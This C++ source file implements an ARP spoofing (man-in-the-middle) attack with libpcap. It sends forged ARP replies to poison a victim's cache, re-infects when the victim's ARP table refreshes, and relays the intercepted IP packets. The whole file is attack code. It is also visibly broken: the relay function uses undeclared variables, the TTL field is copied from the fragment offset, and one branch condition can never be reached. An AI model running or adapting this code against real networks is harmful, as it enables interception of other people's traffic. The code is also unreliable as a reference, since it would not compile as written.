#include "infection.h"

void sendArp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac,
			 Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dmac;
	packet.eth_.smac_ = ether_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.op_ = htons(mode);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "[*] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n\n------------------------------\n");
		printf("[*] Arp packet sending succeeded!");
		printf("\n------------------------------\n\n");
	}
}

EthArpPacket* receiveArp(int mode, pcap_t *handle)
{
	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *arp_packet;
		int result = pcap_next_ex(handle, &header, &arp_packet);
		if (result != 1)
		{
			continue;
		}
		EthArpPacket *arp = (EthArpPacket *)arp_packet;

		std::string mode_str;
		if (mode == 1U)
		{
			mode_str = "Request";
		}
		else if (mode == 2U)
		{
			mode_str = "Reply";
		}
		if (ntohs(arp->arp_.op_) == mode && ntohs(arp->eth_.type_) == EthHdr::Arp)
		{
			printf("\n\n------------------------------\n");
			std::cout << "[*] Arp " << mode_str << " Packet captured..\n";
			printf("src ip : %s\n", std::string(Ip(ntohl(arp->arp_.sip_))).data());
			printf("src mac : %s\n", std::string(arp->eth_.smac_).data());
			printf("dst ip : %s\n", std::string(Ip(ntohl(arp->arp_.tip_))).data());
			printf("dst mac : %s\n", std::string(arp->eth_.dmac_).data());
			printf("------------------------------\n\n\n");
			return arp;
		}
	}
}

void getSenderMac(pcap_t *handle, Mac src_mac, Ip src_ip, char *dst_mac, Ip arp_tip)
{
	printf("[*] Infection..\n");
	sendArp(ArpHdr::Request, handle, Mac("FF:FF:FF:FF:FF:FF"), Mac(src_mac),
			Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));

	EthArpPacket *pkt = receiveArp(ArpHdr::Reply, handle);
	if (pkt->arp_.sip_ == Ip(htonl(arp_tip)) && pkt->arp_.tip_ == Ip(htonl(src_ip)))
	{
		strcpy(dst_mac, std::string(pkt->arp_.smac_).c_str());
	}
	return;
}

bool needToReinfect(pcap_t *handle, char *send_ip, char *tar_ip, char *att_ip)
{
	// 'if' condition 1 : broadcast
	// 'if' condition 2, 3 : broadcast from sender or target
	EthArpPacket *pkt = receiveArp(ArpHdr::Request, handle);
	if (strcmp(std::string(pkt->eth_.dmac_).c_str(), "FF:FF:FF:FF:FF:FF") == 0)
    {
        printf("[*] sender arp table refreshed!!\n");
        if(ntohl(pkt->arp_.sip_) == Ip(send_ip))
        {
            printf("[*] sender broadcasts to get target's mac\n");
        }
        else if(ntohl(pkt->arp_.sip_) == Ip(send_ip) && ntohl(pkt->arp_.tip_) == Ip(tar_ip))
        {
            printf("[*] target broadcasts to get sender's mac\n");
        }
        else if(ntohl(pkt->arp_.tip_) == Ip(tar_ip) )
		{
			printf("[*] attacker broadcasts to get target's mac");
		}
		else
        {
            printf("[*] target broadcasts to get other host's mac\n");
        }
        return true;
    }
	return false;
}

void relayIpPacket(pcap_t *handle, const u_char *packet)
{
	((struct EthIpPacket *)packet)->eth_.smac_ = flow.attackerMac;
	((struct EthIpPacket *)packet)->eth_.dmac_ = flow.targetMac;
	SendIp(handle, rePacket, header->len);
	printf("Relay : %s\n", std::string(flow.senderIp).c_str());
	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *ip_packet;
		int result = pcap_next_ex(handle, &header, &ip_packet);
		if (result != 1)
		{
			continue;
		}
		IpPacket *ip = (IpPacket *)ip_packet;
		
		// printf("packet ip : %s\n", std::string(Ip(ntohl(ip->ip_.sip_))).data());
		// printf("send ip : %s\n", std::string(send_ip).c_str());
		if (ntohl((ip->ip_.sip_)) == send_ip && 
		ip->eth_.dmac_ == att_mac)
		{
			printf("[*] Spoofed ip packet captured..\n");
			printf("src ip : %s...\n", std::string(Ip(ntohl(ip->ip_.sip_))).data());
			printf("src mac : %s...\n", std::string(ip->eth_.smac_).data());
			printf("dst ip : %s...\n", std::string(Ip(ntohl(ip->ip_.dip_))).data());
			printf("dst mac : %s...\n", std::string(ip->eth_.dmac_).data());
			IpPacket packet;

			packet.eth_.dmac_ = att_mac;
			packet.eth_.smac_ = ip->eth_.dmac_;
			packet.eth_.type_ = htons(EthHdr::Ip4);

			packet.ip_.hl_ = ip->ip_.hl_;
			packet.ip_.v_ = ip->ip_.v_;

			packet.ip_.tos_ = ip->ip_.tos_;

			packet.ip_.len_ = ip->ip_.len_;
			packet.ip_.id_ = ip->ip_.id_;
			packet.ip_.off_ = ip->ip_.off_;

			packet.ip_.ttl_ = ip->ip_.off_;
			packet.ip_.p_ = ip->ip_.p_;
			packet.ip_.sum_ = ip->ip_.sum_;

			packet.ip_.sip_ = ip->ip_.sip_;
			packet.ip_.dip_ = ip->ip_.dip_;

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(IpPacket));
			if (res != 0)
			{
				fprintf(stderr, "[*] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			else
			{
				printf("\n\n------------------------------\n");
				printf("[*] Ip packet replay succeeded!");
				printf("\n------------------------------\n\n");
			}
		}
	}
}

void spoofProcess(int mode, pcap_t *handle, char* ether_dmac, Mac ether_smac,
			 Mac arp_smac, char* arp_sip, Mac arp_tmac, Ip arp_tip, char* att_ip)
{
	struct pcap_pkthdr *header;
	const u_char *packet;
	while(true)
	{
		int result = pcap_next_ex(handle, &header, &packet);
		if (result == 0)
			continue;
		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
			break;
		}
		if (needToReinfect(handle, ether_dmac, arp_sip, att_ip))
			sendArp(ArpHdr::Reply, handle, Mac(ether_dmac), Mac(ether_dmac), arp_smac, Ip(arp_sip), arp_tmac, arp_tip);
		else
			relayIpPacket(handle, packet);
			
	}
	
}